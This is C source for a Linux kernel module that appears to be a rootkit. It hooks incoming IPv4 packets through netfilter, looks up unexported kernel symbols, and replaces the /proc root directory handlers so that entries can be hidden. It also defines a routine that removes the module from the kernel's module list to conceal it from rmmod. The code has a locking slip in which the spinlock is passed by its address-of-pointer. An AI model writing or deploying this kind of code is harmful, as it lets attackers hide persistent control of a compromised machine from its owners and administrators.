#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/proc_fs.h>
#include <linux/kallsyms.h>
#include "util.h"
#include "module.h"


/* This is the structure we shall use to register our function */
static struct nf_hook_ops nfho;
struct module *me;

spinlock_t	 *_proc_dir_spinlock;
struct mutex     *_module_mutex;

/* Backup of the previous handlers */ 
struct file_operations proc_original_file_operations;
struct inode_operations proc_original_inode_operations;


/* This is the hook function itself */
extern unsigned int hook_func (
	unsigned int hooknum,	
	struct sk_buff **skb,	
	const struct net_device *in,	
	const struct net_device *out, 
	int (*okfn) (struct sk_buff *));

/* Initializes our references to kernel symbols that are not exported. */
void init_symbols(void)
{
	_proc_dir_spinlock = (spinlock_t *) my_sym_lookup("proc_subdir_lock");
	_module_mutex = (struct mutex *) my_sym_lookup("module_mutex");
}

/* Initialisation routine */
int init_module ()
{
	/* Fill in our hook structure */
	nfho.hook = hook_func;

	/* Handler function */
	nfho.hooknum = NF_IP_PRE_ROUTING;	/* First for IPv4 */
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST;	/* Make our func first */

	nf_register_hook (&nfho);

	// Safe pointer to us!
	me = &__this_module;

	init_symbols();

	printk("Address of module_mutex: %p\n", _module_mutex);
	printk("Address of proc_dir_spinlock: %p\n", _proc_dir_spinlock);

	// Hide the module.
	//hide_module();
	
	// Backup previous handlers.
	proc_original_file_operations.readdir = proc_root.proc_fops->readdir;
	proc_original_inode_operations.lookup = proc_root.proc_iops->lookup;
	
	// New handlers. With a bit of magic because the compiler is stupid
	spin_lock(&_proc_dir_spinlock);

	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = new_proc_readdir;
	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = new_proc_lookup;
  
	spin_unlock(&_proc_dir_spinlock);

	return 0;
}

/* Cleanup routine */
void cleanup_module ()
{
	printk("Removing module bastardo..");

	nf_unregister_hook (&nfho);

	// Restore proc fs handlers.
	spin_lock(&_proc_dir_spinlock);

	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = proc_original_file_operations.readdir;
	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = proc_original_inode_operations.lookup ;

	spin_unlock(&_proc_dir_spinlock);

}

// Removes this module from the kernel modules list. rmmod would stop working for this module.
void hide_module()
{
	mutex_lock(_module_mutex);

	list_del(&(me->list));

	mutex_unlock(_module_mutex);
}


MODULE_LICENSE("GPL"); 

